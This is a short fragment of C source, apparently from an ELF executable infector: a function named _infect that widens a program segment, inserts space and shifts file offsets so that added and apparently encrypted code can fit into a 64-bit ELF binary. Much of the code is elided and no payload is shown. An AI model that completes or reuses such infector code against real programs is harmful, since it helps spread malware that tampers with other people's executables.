...
static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	...
	if (diff > 0){
		...
		oldn = *n;
		olds = *s;
		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz-1, diff);
		elf_shift_offset(*s, *n, ph[x].p_offset+ph[x].p_filesz-1, diff);
		//reset it
		Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
